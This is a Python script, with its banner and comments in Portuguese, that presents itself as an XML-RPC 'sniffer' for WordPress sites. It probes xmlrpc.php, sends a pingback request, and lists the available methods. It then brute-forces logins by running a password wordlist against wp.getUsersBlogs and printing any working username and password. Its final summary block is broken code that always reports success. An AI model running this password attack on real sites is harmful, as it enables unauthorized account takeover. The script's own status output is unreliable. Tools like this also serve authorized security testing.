#!/usr/bin/env python3
# Importação das bibliotecas necessárias
import xmlrpc.client
import os
import http.client
import urllib.parse

# Função para imprimir em cores
def print_color(message, color):
    colors = {"red": "\033[91m", "green": "\033[92m", "blue": "\033[94m", "orange": "\033[33m"}
    end_color = "\033[0m"
    print(colors[color] + message + end_color)

# Banner do programa
print_color('''
          __
 (\,--------'()'--o
 (_    ___    /~""
  (_)_)  (_)_)
  
  By M4Tr1XpDb
''', "orange")
print_color("Bem-vindo ao Valdivia, farejador de XMLRPC\n", "orange")

# Teste sayHello
site = input("Digite o endereço do sistema com xmlrpc:\n Exemplo: https://wordpress.com/xmlrpc.php\n")
client = xmlrpc.client.ServerProxy(site)
try:
    result = client.demo.sayHello()
    print_color("Teste sayHello executado com sucesso!", "green")
except Exception as e:
    print_color(f"Erro ao executar o teste sayHello: {e}", "red")

# Teste pingback
target_url = input("\nDigite o endereço do site para testar o pingback:\n Exemplo: https://meu_site_falso.com\n")
target_url = target_url.rstrip("/")  # Remove a barra no final da URL, se existir
try:
    # Monta a requisição de pingback
    headers = {"Content-type": "text/xml"}
    body = f"""<?xml version="1.0" encoding="UTF-8"?>
                <methodCall>
                    <methodName>pingback.ping</methodName>
                    <params>
                        <param>
                            <value><string>{site}</string></value>
                        </param>
                        <param>
                            <value><string>{target_url}</string></value>
                        </param>
                    </params>
                </methodCall>"""
    # Envia a requisição de pingback
    conn = http.client.HTTPSConnection(target_url.split("//")[1])
    conn.request("POST", "/xmlrpc.php", body, headers)
    response = conn.getresponse()

    # Verifica o resultado da requisição
    if response.status == 200:
        data = response.read()
        if "faultCode" in str(data):
            print_color("Erro ao executar o teste pingback!", "red")
        else:
            print_color("Teste pingback executado com sucesso!", "green")
            print_color("Resposta do servidor:", "blue")
            print(data.decode("utf-8"))
    else:
        print_color("Erro ao executar o teste pingback!", "red")
except Exception as e:
    print_color(f"Erro ao executar o teste pingback: {e}", "red")
    
    # Teste de métodos ativos
try:
    methods = client.system.listMethods()
    print_color("\nMétodos ativos no sistema:", "green")
    for method in methods:
        print_color(method, "orange")
except Exception as e:
    print_color(f"Erro ao executar o teste de métodos ativos: {e}", "red")
    
# Teste de login
username = input("\nDigite o nome de usuário para testar o login:\n")
password_file = input("Digite o caminho completo do arquivo com as senhas:\n Exemplo: /usr/share/wordlists/ \n")

if not os.path.isfile(password_file):
    print_color("Arquivo de senhas não encontrado!", "red")
    exit()

with open(password_file, "r") as f:
    passwords = [line.strip() for line in f.readlines()]

for password in passwords:
    try:
        client = xmlrpc.client.ServerProxy(site)
        result = client.wp.getUsersBlogs(username, password)
        print_color(f"Login bem-sucedido! Usuário: {username} | Senha: {password}", "green")
        break
    except Exception as e:
        print_color(f"Falha no login com senha {password}.", "red")
else:
    print_color(f"Falha no login para o usuário {username}.", "red")
    
# Resumo dos resultados
printed_messages = []
for color in ["green", "red"]:
    color_messages = [msg for msg in os.linesep.join(printed_messages).split(os.linesep) if color in msg.lower()]
    if color_messages:
        print_color(os.linesep.join(color_messages), color)
        printed_messages.append(os.linesep.join(color_messages))
if not printed_messages:
    print_color("Todos os testes foram executados com sucesso!", "green")
